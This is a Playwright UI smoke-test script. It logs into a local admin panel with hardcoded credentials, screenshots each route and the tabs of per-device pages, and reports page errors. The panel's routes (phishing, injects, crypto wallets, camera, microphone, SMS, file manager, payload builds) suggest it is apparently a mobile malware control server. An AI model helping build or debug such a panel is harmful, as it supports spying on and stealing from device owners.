import { chromium } from 'playwright';
import fs from 'node:fs';

const BASE = 'http://127.0.0.1:8080';
const OUT = 'C:\\Users\\Administrator\\Desktop\\stST\\local\\shots\\1to1';
fs.mkdirSync(OUT, { recursive: true });

const ROUTES = ['/', '/serverstatus', '/users', '/groups', '/security', '/strategy', '/smsnoti', '/builds', '/ai', '/aitemplate', '/injdata', '/inject', '/appmanager', '/phish', '/cryptowallet', '/blacklist', '/batch', '/autocommands', '/turn-nodes', '/telegram', '/locale', '/filemanager', '/camera', '/microphone', '/album', '/permissions'];

const browser = await chromium.launch({ channel: 'chrome', headless: true });
const ctx = await browser.newContext({ viewport: { width: 1600, height: 1000 } });
const pg = await ctx.newPage();

const report = [];
let cur = { route: null, console: [], pageerror: [], bad: [] };
pg.on('console', m => { if (m.type() === 'error') cur.console.push(m.text().slice(0, 200)); });
pg.on('pageerror', e => cur.pageerror.push(String(e).slice(0, 200)));
pg.on('response', r => {
  const u = r.url();
  if ((u.indexOf('/m/') >= 0 || u.indexOf('/api/') >= 0) && r.status() >= 400) {
    cur.bad.push(r.status() + ' ' + u.replace(BASE, '').slice(0, 110));
  }
});

async function screenshot(name) {
  try { await pg.screenshot({ path: OUT + '\\' + name + '.png', fullPage: false }); } catch (e) {}
}
async function heading() {
  try {
    return await pg.evaluate(() => {
      const m = document.querySelector('main') || document.body;
      return (m.innerText || '').replace(/\s+/g, ' ').slice(0, 150);
    });
  } catch (e) { return 'EVAL_FAIL'; }
}

// ---------- login ----------
await pg.goto(BASE + '/#/login', { waitUntil: 'domcontentloaded' });
await pg.waitForTimeout(2000);
const ins = pg.locator('input:not([type=checkbox])');
await ins.nth(0).fill('admin');
await ins.nth(1).fill('admin123');
await pg.locator('button[type=submit]').first().click();
await pg.waitForTimeout(3500);
const tok = await pg.evaluate(() => (localStorage.getItem('token') || '').slice(0, 24));
console.log('LOGIN token=' + (tok || 'NONE') + ' hash=' + (await pg.evaluate(() => location.hash)));

// ---------- sidebar link sweep ----------
let links = [];
try {
  links = await pg.evaluate(() => [...document.querySelectorAll('a[href*="#/"]')].map(a => a.getAttribute('href')).filter((v, i, s) => v && s.indexOf(v) === i));
} catch (e) {}
console.log('SIDEBAR LINKS: ' + links.length);

for (const r of ROUTES) {
  cur = { route: r, console: [], pageerror: [], bad: [] };
  try {
    await pg.goto(BASE + '/#' + r, { waitUntil: 'domcontentloaded' });
    await pg.reload({ waitUntil: 'domcontentloaded' });
    await pg.waitForTimeout(2400);
  } catch (e) { cur.pageerror.push('NAV: ' + String(e).slice(0, 150)); }
  const head = await heading();
  await screenshot('page' + (r === '/' ? '_index' : r.replace(/\//g, '_').replace(/^_/, '')));
  report.push({ route: r, head, console: cur.console.slice(), pageerror: cur.pageerror.slice(), bad: cur.bad.slice() });
}

// ---------- device list + device control page ----------
await pg.goto(BASE + '/#/', { waitUntil: 'domcontentloaded' });
await pg.reload({ waitUntil: 'domcontentloaded' });
await pg.waitForTimeout(2500);
let devIds = [];
try { devIds = await pg.evaluate(() => fetch('/m/device-ids', { headers: { Authorization: 'Bearer ' + localStorage.getItem('token') } }).then(r => r.json())); } catch (e) {}
console.log('DEVICE IDS: ' + JSON.stringify(devIds));

for (const dev of (devIds || [])) {
  cur = { route: 'device:' + dev, console: [], pageerror: [], bad: [] };
  await pg.goto(BASE + '/?standalone=1#/devices/' + dev + '/show', { waitUntil: 'domcontentloaded' });
  await pg.reload({ waitUntil: 'domcontentloaded' });
  await pg.waitForTimeout(4000);
  const head = await heading();
  await screenshot('device_' + dev + '_overview');
  report.push({ route: 'device:' + dev, head, console: cur.console.slice(), pageerror: cur.pageerror.slice(), bad: cur.bad.slice(), tabs: [] });
  const rec = report[report.length - 1];

  const tabCount = await pg.locator('[role=tab]').count();
  console.log('DEVICE ' + dev + ' tabs=' + tabCount);
  for (let i = 0; i < tabCount; i++) {
    const t = pg.locator('[role=tab]').nth(i);
    const label = ((await t.innerText().catch(() => '')) || '').trim().slice(0, 24);
    cur.console = []; cur.pageerror = []; cur.bad = [];
    await t.click().catch(() => {});
    await pg.waitForTimeout(2600);
    const h = await heading();
    await screenshot('device_' + dev + '_tab' + String(i).padStart(2, '0') + '_' + label.replace(/[^\w\u4e00-\u9fff]/g, ''));
    rec.tabs.push({ i, label, head: h, console: cur.console.slice(), pageerror: cur.pageerror.slice(), bad: cur.bad.slice() });
    console.log('   tab ' + i + ' [' + label + '] bad=' + cur.bad.length + ' err=' + cur.pageerror.length);
  }
}

fs.writeFileSync('C:\\Users\\Administrator\\Desktop\\stST\\local\\_ui_report.json', JSON.stringify(report, null, 1), 'utf8');
let ok = 0, fail = 0;
for (const e of report) {
  const bad = e.bad.length + e.pageerror.length;
  if (bad === 0) ok++; else fail++;
  console.log((bad === 0 ? 'OK  ' : 'FAIL') + ' ' + (e.route || '') + (bad ? '  ' + e.bad.slice(0, 3).join(' , ') + ' ' + e.pageerror.slice(0, 2).join(' | ') : ''));
}
console.log('TOTAL ok=' + ok + ' fail=' + fail + ' of ' + report.length);
await browser.close();
